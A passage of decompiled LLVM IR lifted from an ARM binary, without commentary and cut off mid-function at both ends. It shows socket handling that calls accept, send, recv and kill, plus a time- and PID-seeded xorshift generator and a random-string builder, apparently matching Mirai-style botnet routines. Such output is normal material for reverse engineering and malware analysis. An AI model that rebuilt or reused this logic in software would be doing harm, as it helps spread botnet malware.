  %v1_1164c = call i32 @_close(i32 %v2_11648)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_11654 = load i32, i32* @r5, align 4
  %v2_11654 = inttoptr i32 %v1_11654 to i32*
  store i32 -1, i32* %v2_11654, align 4
  %v0_11658 = call i32 @function_117dc()
  %v2_11660 = urem i32 %v0_11658, 10
  %v1_11664 = add nuw nsw i32 %v2_11660, 1
  %v1_11668 = call i32 @_sleep(i32 %v1_11664)
  br label %dec_label_pc_11270.backedge

dec_label_pc_11670:                               ; preds = %dec_label_pc_113b0
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_11620, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v5_11688 = call i32 @_accept(i32 %v2_113a4, i32 %v2_11680, i32 %v2_11620, i32 16, i32 16)
  %v1_1168c = call i32 @function_1200c(i32 %v5_11688)
  %v1_11690 = call i32 @function_feac(i32 %v1_1168c)
  %v1_11694 = call i32 @function_b084(i32 %v1_11690)
  store i32 %v1_1122c, i32* %r2.global-to-local, align 4
  %v2_116a4 = call i32 @_kill(i32 %v1_116a0, i32 9)
  %v1_116ac = call i32 @_exit(i32 0)
  br label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_11610, %dec_label_pc_11670
  %v2_116b4 = call i32 @function_1460c(i8* %v1_116b4)
  %v3_116b4 = trunc i32 %v2_116b4 to i8
  store i8 %v3_116b4, i8* %stack_var_-38, align 1
  %v0_116bc = call i32 @function_148c4()
  %v0_116c0 = load i32, i32* @r4, align 4
  store i32 %v0_116c0, i32* %r2.global-to-local, align 4
  %v1_116c4 = load i32, i32* @fp, align 4
  %v2_116c4 = inttoptr i32 %v1_116c4 to i32*
  store i32 %v0_116bc, i32* %v2_116c4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_116d0 = load i32, i32* @r5, align 4
  %v1_116d0 = inttoptr i32 %v0_116d0 to i32*
  %v2_116d0 = load i32, i32* %v1_116d0, align 4
  %v4_116d4 = call i32 @_send(i32 %v2_116d0, i32 ptrtoint (i32* @global_var_14fe8.216 to i32), i32 %v0_116c0, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_116e0 = load i32, i32* @r5, align 4
  %v1_116e0 = inttoptr i32 %v0_116e0 to i32*
  %v2_116e0 = load i32, i32* %v1_116e0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_116ec = call i32 @_send(i32 %v2_116e0, i32 %v2_115fc, i32 1, i32 16384)
  %v3_116f0 = load i8, i8* %stack_var_-38, align 1
  %v4_116f0 = sext i8 %v3_116f0 to i32
  store i32 %v4_116f0, i32* %r2.global-to-local, align 4
  %v2_116f4 = icmp eq i8 %v3_116f0, 0
  br i1 %v2_116f4, label %dec_label_pc_11270.backedge, label %dec_label_pc_116fc

dec_label_pc_116fc:                               ; preds = %dec_label_pc_116b0
  %v0_116fc = load i32, i32* @r5, align 4
  %v1_116fc = inttoptr i32 %v0_116fc to i32*
  %v2_116fc = load i32, i32* %v1_116fc, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11708 = call i32 @_send(i32 %v2_116fc, i32 %v2_110d4, i32 %v4_116f0, i32 16384)
  br label %dec_label_pc_11270.backedge

dec_label_pc_11710:                               ; preds = %dec_label_pc_11520, %dec_label_pc_114a8
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_114a8 ], [ %v1_11504, %dec_label_pc_11520 ]
  %v0_11710 = load i32, i32* @r8, align 4
  %v1_11710 = inttoptr i32 %v0_11710 to i32*
  %v2_11710 = load i32, i32* %v1_11710, align 4
  store i32 %v2_11710, i32* %r3.global-to-local, align 4
  %v7_11714 = icmp eq i32 %v2_11710, 4
  br i1 %v7_11714, label %dec_label_pc_11270.backedge, label %bb86

bb86:                                             ; preds = %dec_label_pc_11710
  %v8_11718 = icmp eq i32 %v2_11710, 11
  br i1 %v8_11718, label %dec_label_pc_11270.backedge, label %dec_label_pc_1155c

dec_label_pc_11724:                               ; preds = %dec_label_pc_114e0
  %v2_11728 = load i32, i32* @global_var_1d908.209, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11738 = call i32 @_recv(i32 %v2_11728, i32 %v2_115fc, i32 2, i32 16384)
  br label %dec_label_pc_11270.backedge

dec_label_pc_11740:                               ; preds = %dec_label_pc_11554
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_11750 = load i32, i32* @global_var_1d908.209, align 4
  %v4_11754 = call i32 @_recv(i32 %v2_11750, i32 %v2_115fc, i32 2, i32 16384)
  %v3_11758 = load i8, i8* %stack_var_-38, align 1
  %v4_11758 = sext i8 %v3_11758 to i32
  %v4_11760 = mul nsw i32 %v4_11758, 256
  %v5_11760 = or i32 %v4_11760, %v4_11524
  store i32 %v5_11760, i32* %r2.global-to-local, align 4
  store i32 %v4_11758, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_11774 = load i32, i32* @global_var_1d908.209, align 4
  store i8 %v1_11504, i8* %stack_var_-38, align 1
  %v7_11780 = call i32 @_recv(i32 %v2_11774, i32 %v2_11530, i32 %v5_11760, i32 16384)
  %v3_11784 = load i8, i8* %stack_var_-38, align 1
  %v4_11784 = sext i8 %v3_11784 to i32
  store i32 %v4_11784, i32* %r2.global-to-local, align 4
  %v4_11788 = zext i8 %v3_11758 to i32
  store i32 %v4_11788, i32* %r3.global-to-local, align 4
  %v4_1178c = mul nuw nsw i32 %v4_11788, 256
  %v5_1178c = or i32 %v4_11784, %v4_1178c
  %v7_1178c = icmp eq i32 %v5_1178c, 0
  br i1 %v7_1178c, label %dec_label_pc_11270.backedge, label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_11740
  %v5_11798 = call i32 @function_ae30(i32* nonnull %stack_var_-1616, i32 %v5_1178c, i32 %v4_11784, i32 %v4_11788)
  br label %dec_label_pc_11270.backedge

; uselistorder directives
  uselistorder i32 %v4_11788, { 1, 0, 2 }
  uselistorder i32 %v4_11784, { 1, 0, 2 }
  uselistorder i32 %v4_11758, { 1, 0 }
  uselistorder i8 %v3_11758, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 1, 0, 2 }
  uselistorder i32 %v3_1158c, { 1, 3, 2, 0 }
  uselistorder i32 %v4_11548, { 1, 0 }
  uselistorder i32 %v4_11524, { 1, 0 }
  uselistorder i8 %v1_11504, { 0, 2, 1 }
  uselistorder i32 %v3_114fc4, { 0, 2, 1 }
  uselistorder i32 %v4_114f8, { 1, 0 }
  uselistorder i32 %v4_114cc, { 1, 0 }
  uselistorder i32 %v2_11470, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_113a4, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %v5_11360, { 2, 1, 0 }
  uselistorder i32 %v2_112a4, { 2, 1, 0 }
  uselistorder i32 %v1_11294, { 1, 2, 0 }
  uselistorder i32 %v1_1127c, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 3, 1, 2 }
  uselistorder i32 %v2_11620, { 1, 0, 2, 3 }
  uselistorder i32 %v2_115fc, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_1126c, { 1, 0, 2 }
  uselistorder i32 %v2_11268, { 1, 0, 2 }
  uselistorder i32 %v3_111d4, { 1, 2, 0 }
  uselistorder i32 %v2_1111c, { 0, 9, 1, 10, 2, 3, 4, 5, 8, 6, 11, 7 }
  uselistorder i32 %v1_11068, { 1, 0 }
  uselistorder i32 %v1_11038, { 1, 0 }
  uselistorder i32 %v0_1102c, { 1, 0 }
  uselistorder i32 %v1_11004, { 1, 0 }
  uselistorder i32 %v0_10ff8, { 1, 0 }
  uselistorder i32 %v1_10fd0, { 1, 0 }
  uselistorder i32 %v0_10fc4, { 1, 0 }
  uselistorder i32 %v1_10f9c, { 1, 0 }
  uselistorder i32 %v0_10f8c, { 1, 0 }
  uselistorder i32 %v0_10f68, { 1, 0 }
  uselistorder i32 %v3_10e44, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-48, { 0, 1, 2, 4, 3, 5 }
  uselistorder i8* %stack_var_-106, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 0, 2 }
  uselistorder i8* %stack_var_-38, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 57, 58, 41, 42, 38, 55, 56, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32* @global_var_1d90c.167, { 1, 0 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* bitcast (i8** @global_var_1d960.212 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1d960.212, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1d960.212 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1d904.169, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_1d908.209, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 (i32, i32, i32)* @_write, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_14634, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 (i32, i32)* @function_11890, { 2, 1, 0 }
  uselistorder i32 ()* @function_10bdc, { 1, 0 }
  uselistorder i8** @global_var_1d9b8.174, { 1, 0 }
  uselistorder i32 47, { 4, 5, 0, 6, 1, 7, 2, 8, 9, 3 }
  uselistorder i32 (i32, i32)* @_open, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10bc4.179 to i32), { 1, 0 }
  uselistorder i32 (i32, i32)* @_signal, { 1, 0 }
  uselistorder i32 (i32)* @_unlink, { 1, 0 }
  uselistorder label %dec_label_pc_116b0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_11520, { 1, 0 }
  uselistorder label %dec_label_pc_11270.backedge, { 5, 11, 4, 10, 12, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_113a0, { 2, 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_112e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_112d8, { 1, 0 }
  uselistorder label %dec_label_pc_11290.dec_label_pc_11290_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11278.dec_label_pc_11278_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_110f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110d0, { 2, 0, 1 }
}

define i32 @function_117dc() local_unnamed_addr {
dec_label_pc_117dc:
  %v2_117e8 = load i32, i32* @global_var_1d964.218, align 4
  %v2_117ec = load i32, i32* @global_var_1d970.220, align 4
  store i32 ptrtoint (i32* @global_var_1d968.222 to i32), i32* @lr, align 4
  %v4_117f8 = mul i32 %v2_117e8, 2048
  %v5_117f8 = xor i32 %v4_117f8, %v2_117e8
  %v4_117fc = udiv i32 %v2_117ec, 524288
  %v5_117fc = xor i32 %v4_117fc, %v2_117ec
  %v2_11800 = load i32, i32* @global_var_1d968.222, align 4
  %v2_11804 = load i32, i32* @global_var_1d96c.224, align 4
  %v2_11808 = xor i32 %v5_117fc, %v5_117f8
  %v4_1180c = udiv i32 %v5_117f8, 256
  %v5_1180c = xor i32 %v2_11808, %v4_1180c
  store i32 %v2_11800, i32* @global_var_1d964.218, align 4
  store i32 %v2_11804, i32* @global_var_1d968.222, align 4
  store i32 %v2_117ec, i32* @global_var_1d96c.224, align 4
  store i32 %v5_1180c, i32* @global_var_1d970.220, align 4
  ret i32 %v5_1180c

; uselistorder directives
  uselistorder i32 %v2_117ec, { 2, 1, 0 }
  uselistorder i32 %v2_117e8, { 1, 0 }
}

define i32 @function_11834(i32 %arg1) local_unnamed_addr {
dec_label_pc_11834:
  %stack_var_-12 = alloca i32, align 4
  %v3_11834 = load i32, i32* @r4, align 4
  store i32 %v3_11834, i32* %stack_var_-12, align 4
  %v1_1183c = call i32 @_time(i32 0)
  store i32 %v1_1183c, i32* @global_var_1d964.218, align 4
  %v1_11848 = call i32 @_getpid(i32 %v1_1183c)
  %v0_11850 = call i32 @_getppid()
  %v2_11858 = xor i32 %v1_11848, %v0_11850
  store i32 %v2_11858, i32* @global_var_1d968.222, align 4
  %v1_11860 = call i32 @_clock(i32 %v0_11850)
  %v2_11864 = load i32, i32* @global_var_1d968.222, align 4
  %v2_11870 = xor i32 %v2_11864, %v1_11860
  store i32 %v2_11870, i32* @global_var_1d970.220, align 4
  store i32 %v1_11860, i32* @global_var_1d96c.224, align 4
  %v2_1187c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1187c, i32* @r4, align 4
  ret i32 %v1_11860

; uselistorder directives
  uselistorder i32 %v1_11860, { 1, 2, 0 }
  uselistorder i32 %v0_11850, { 1, 0 }
  uselistorder i32 ()* @_getppid, { 0, 2, 1 }
  uselistorder i32 (i32)* @_getpid, { 0, 2, 1 }
}

define i32 @function_11890(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11890:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11890 = load i32, i32* @r4, align 4
  store i32 %v3_11890, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_15028.230 to i32), i32* %r1.global-to-local, align 4
  %v2_118a4 = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_118a4, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r2.global-to-local, align 4
  %v4_118ac = call i32 @_memcpy(i32 %v2_118a4, i32 ptrtoint ([33 x i8]* @global_var_15028.230 to i32), i32 33)
  store i32 %v4_118ac, i32* %r0.global-to-local, align 4
  %v0_118b0 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_118b0 = icmp slt i32 %v0_118b0, 0
  store i1 %v1_118b0, i1* %cpsr_n.global-to-local, align 1
  %v2_118b0 = icmp eq i32 %v0_118b0, 0
  store i1 %v2_118b0, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_118b0, 1
  br i1 %tmp20, label %dec_label_pc_1199c, label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %dec_label_pc_11890
  store i32 ptrtoint (i32* @global_var_1d970.220 to i32), i32* %fp.global-to-local, align 4
  %v2_118c4 = load i32, i32* @global_var_1d96c.224, align 4
  store i32 %v2_118c4, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d964.218 to i32), i32* %r3.global-to-local, align 4
  %v2_118cc = load i32, i32* @global_var_1d968.222, align 4
  store i32 %v2_118cc, i32* %sl.global-to-local, align 4
  %v2_118d0 = load i32, i32* @global_var_1d970.220, align 4
  store i32 %v2_118d0, i32* %r6.global-to-local, align 4
  %v2_118d4 = load i32, i32* @global_var_1d964.218, align 4
  store i32 %v2_118d4, i32* %ip.global-to-local, align 4
  %v0_118d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_118d8 = add i32 %v0_118d8, 1
  store i32 %v1_118d8, i32* %r7.global-to-local, align 4
  %v2_118e4 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_11944

dec_label_pc_118e0:                               ; preds = %dec_label_pc_11944
  %v1_118e0 = udiv i32 %v5_11950, 8
  %v4_118e8 = urem i32 %v1_118e0, 32
  %v5_118e8 = add i32 %v4_118e8, %v2_118e4
  store i32 %v5_118e8, i32* %r0.global-to-local, align 4
  %v3_118ec = mul i32 %v5_11950, 65536
  store i32 %v3_118ec, i32* %r2.global-to-local, align 4
  store i32 %v2_118e4, i32* %r3.global-to-local, align 4
  %v3_118f4 = mul i32 %v5_11950, 256
  store i32 %v3_118f4, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_11950, 2048
  %v4_118f8 = urem i32 %tmp21, 32
  %v5_118f8 = add i32 %v4_118f8, %v2_118e4
  store i32 %v5_118f8, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_11950, 524288
  %v4_118fc = urem i32 %tmp22, 32
  %v5_118fc = add i32 %v4_118fc, %v2_118e4
  %v4_11900 = udiv i32 %v2_1194c, 134217728
  %v5_11900 = add i32 %v4_11900, %v2_118e4
  store i32 %v5_11900, i32* %r4.global-to-local, align 4
  %v1_11904 = add i32 %v5_118f8, -33
  %v2_11904 = inttoptr i32 %v1_11904 to i8*
  %v3_11904 = load i8, i8* %v2_11904, align 1
  %v4_11904 = zext i8 %v3_11904 to i32
  store i32 %v4_11904, i32* %r2.global-to-local, align 4
  %v1_11908 = add i32 %v5_118e8, -33
  %v2_11908 = inttoptr i32 %v1_11908 to i8*
  %v3_11908 = load i8, i8* %v2_11908, align 1
  %v4_11908 = zext i8 %v3_11908 to i32
  store i32 %v4_11908, i32* %r3.global-to-local, align 4
  %v1_1190c = add i32 %v5_118fc, -33
  %v2_1190c = inttoptr i32 %v1_1190c to i8*
  %v3_1190c = load i8, i8* %v2_1190c, align 1
  %v4_1190c = zext i8 %v3_1190c to i32
  store i32 %v4_1190c, i32* %r1.global-to-local, align 4
  %v1_11910 = add i32 %v5_11900, -33
  %v2_11910 = inttoptr i32 %v1_11910 to i8*
  %v3_11910 = load i8, i8* %v2_11910, align 1
  %v4_11910 = zext i8 %v3_11910 to i32
  store i32 %v4_11910, i32* %r0.global-to-local, align 4
  %v1_11914 = add i32 %v0_11914, -4
  store i32 %v1_11914, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11918 = icmp slt i32 %v1_11914, 0
  store i1 %v1_11918, i1* %cpsr_n.global-to-local, align 1
  %v2_11918 = icmp eq i32 %v1_11914, 0
  store i1 %v2_11918, i1* %cpsr_z.global-to-local, align 1
  %v3_1191c = add i32 %v2_1191c, -1
  %v4_1191c = inttoptr i32 %v3_1191c to i8*
  store i8 %v3_11908, i8* %v4_1191c, align 1
  %v0_11920 = load i32, i32* %r2.global-to-local, align 4
  %v1_11920 = trunc i32 %v0_11920 to i8
  %v2_11920 = load i32, i32* %r7.global-to-local, align 4
  %v3_11920 = inttoptr i32 %v2_11920 to i8*
  store i8 %v1_11920, i8* %v3_11920, align 1
  %v0_11924 = load i32, i32* %r1.global-to-local, align 4
  %v1_11924 = trunc i32 %v0_11924 to i8
  %v2_11924 = load i32, i32* %r7.global-to-local, align 4
  %v3_11924 = add i32 %v2_11924, 1
  %v4_11924 = inttoptr i32 %v3_11924 to i8*
  store i8 %v1_11924, i8* %v4_11924, align 1
  %v0_11928 = load i32, i32* %r0.global-to-local, align 4
  %v1_11928 = trunc i32 %v0_11928 to i8
  %v2_11928 = load i32, i32* %r7.global-to-local, align 4
  %v3_11928 = add i32 %v2_11928, 2
  %v4_11928 = inttoptr i32 %v3_11928 to i8*
  store i8 %v1_11928, i8* %v4_11928, align 1
  %v0_1192c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1192c, i32* %ip.global-to-local, align 4
  %v0_11930 = load i32, i32* %r7.global-to-local, align 4
  %v1_11930 = add i32 %v0_11930, 4
  store i32 %v1_11930, i32* %r7.global-to-local, align 4
  %v0_11934 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11934 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_11934 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_11934 = xor i1 %v1_11934, %v2_11934
  %v4_11934 = or i1 %v0_11934, %v3_11934
  br i1 %v4_11934, label %dec_label_pc_11980, label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_11964, %dec_label_pc_118e0
  %v2_119706 = phi i32 [ %v1_11978, %dec_label_pc_11964 ], [ %v1_11930, %dec_label_pc_118e0 ]
  %v0_119442 = phi i32 [ %v0_11974, %dec_label_pc_11964 ], [ %v0_1192c, %dec_label_pc_118e0 ]
  %v0_11938 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11938, i32* %sl.global-to-local, align 4
  %v0_1193c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1193c, i32* %sb.global-to-local, align 4
  %v0_11940 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11940, i32* %r6.global-to-local, align 4
  %v0_11954.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_118b8, %dec_label_pc_11938
  %v2_1191c = phi i32 [ %v1_118d8, %dec_label_pc_118b8 ], [ %v2_119706, %dec_label_pc_11938 ]
  %v0_11914 = phi i32 [ %v0_118b0, %dec_label_pc_118b8 ], [ %v0_11954.pre, %dec_label_pc_11938 ]
  %v0_11948 = phi i32 [ %v2_118d0, %dec_label_pc_118b8 ], [ %v0_11940, %dec_label_pc_11938 ]
  %v0_11944 = phi i32 [ %v2_118d4, %dec_label_pc_118b8 ], [ %v0_119442, %dec_label_pc_11938 ]
  %v4_11944 = mul i32 %v0_11944, 2048
  %v5_11944 = xor i32 %v4_11944, %v0_11944
  store i32 %v5_11944, i32* %r3.global-to-local, align 4
  %v4_11948 = udiv i32 %v0_11948, 524288
  %v5_11948 = xor i32 %v4_11948, %v0_11948
  %v2_1194c = xor i32 %v5_11948, %v5_11944
  store i32 %v2_1194c, i32* %r2.global-to-local, align 4
  %v4_11950 = udiv i32 %v5_11944, 256
  %v5_11950 = xor i32 %v4_11950, %v2_1194c
  store i32 %v5_11950, i32* %r5.global-to-local, align 4
  %v1_11954 = add i32 %v0_11914, -3
  %v2_11954 = icmp ugt i32 %v0_11914, 2
  %v3_11954 = sub i32 2, %v0_11914
  %v4_11954 = and i32 %v3_11954, %v0_11914
  %v5_11954 = icmp slt i32 %v4_11954, 0
  store i1 %v5_11954, i1* %cpsr_v.global-to-local, align 1
  %v6_11954 = icmp slt i32 %v1_11954, 0
  store i1 %v6_11954, i1* %cpsr_n.global-to-local, align 1
  %v7_11954 = icmp eq i32 %v0_11914, 3
  store i1 %v7_11954, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_11950, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_11960 = xor i1 %v7_11954, true
  %v3_11960 = and i1 %v2_11954, %v2_11960
  br i1 %v3_11960, label %dec_label_pc_118e0, label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %dec_label_pc_11944
  %v2_11964 = urem i32 %v5_11950, 33
  store i32 %v2_11964, i32* %r0.global-to-local, align 4
  %v1_11968 = add i32 %v0_11914, -1
  store i32 %v1_11968, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1196c = icmp slt i32 %v1_11968, 0
  store i1 %v1_1196c, i1* %cpsr_n.global-to-local, align 1
  %v2_1196c = icmp eq i32 %v1_11968, 0
  store i1 %v2_1196c, i1* %cpsr_z.global-to-local, align 1
  %v1_11970 = trunc i32 %v2_11964 to i8
  %v3_11970 = add i32 %v2_1191c, -1
  %v4_11970 = inttoptr i32 %v3_11970 to i8*
  store i8 %v1_11970, i8* %v4_11970, align 1
  %v0_11974 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_11974, i32* %ip.global-to-local, align 4
  %v0_11978 = load i32, i32* %r7.global-to-local, align 4
  %v1_11978 = add i32 %v0_11978, 1
  store i32 %v1_11978, i32* %r7.global-to-local, align 4
  %v0_1197c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1197c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1197c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_1197c = xor i1 %v1_1197c, %v2_1197c
  %v4_1197c = or i1 %v0_1197c, %v3_1197c
  br i1 %v4_1197c, label %dec_label_pc_11980, label %dec_label_pc_11938

dec_label_pc_11980:                               ; preds = %dec_label_pc_11964, %dec_label_pc_118e0
  store i32 ptrtoint (i32* @global_var_1d968.222 to i32), i32* %r3.global-to-local, align 4
  %v0_11988 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11988, i32* @global_var_1d96c.224, align 4
  store i32 ptrtoint (i32* @global_var_1d964.218 to i32), i32* %ip.global-to-local, align 4
  %v0_11990 = load i32, i32* %r5.global-to-local, align 4
  %v1_11990 = load i32, i32* %fp.global-to-local, align 4
  %v2_11990 = inttoptr i32 %v1_11990 to i32*
  store i32 %v0_11990, i32* %v2_11990, align 4
  %v0_11994 = load i32, i32* %sb.global-to-local, align 4
  %v1_11994 = load i32, i32* %r3.global-to-local, align 4
  %v2_11994 = inttoptr i32 %v1_11994 to i32*
  store i32 %v0_11994, i32* %v2_11994, align 4
  %v0_11998 = load i32, i32* %sl.global-to-local, align 4
  %v1_11998 = load i32, i32* %ip.global-to-local, align 4
  %v2_11998 = inttoptr i32 %v1_11998 to i32*
  store i32 %v0_11998, i32* %v2_11998, align 4
  %v2_119a0.pre = load i32, i32* %stack_var_-36, align 4
  %v29_119a0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %dec_label_pc_11890, %dec_label_pc_11980
  %v29_119a0 = phi i32 [ %v29_119a0.pre, %dec_label_pc_11980 ], [ %v4_118ac, %dec_label_pc_11890 ]
  %v2_119a0 = phi i32 [ %v2_119a0.pre, %dec_label_pc_11980 ], [ %v3_11890, %dec_label_pc_11890 ]
  store i32 %v2_119a0, i32* @r4, align 4
  ret i32 %v29_119a0

; uselistorder directives
  uselistorder i32 %v1_11978, { 1, 0 }
  uselistorder i32 %v0_11974, { 1, 0 }
  uselistorder i32 %v5_11950, { 5, 6, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_1194c, { 1, 2, 0 }
  uselistorder i32 %v0_11944, { 1, 0 }
  uselistorder i32 %v0_11948, { 1, 0 }
  uselistorder i32 %v0_11914, { 2, 3, 0, 6, 5, 4, 1 }
  uselistorder i32 %v2_1191c, { 1, 0 }
  uselistorder i32 %v2_118e4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_118b0, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 6, 2, 4, 5, 8, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1199c, { 1, 0 }
  uselistorder label %dec_label_pc_11944, { 1, 0 }
}

define i32 @function_119b8(i8* %arg1) local_unnamed_addr {
dec_label_pc_119b8:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
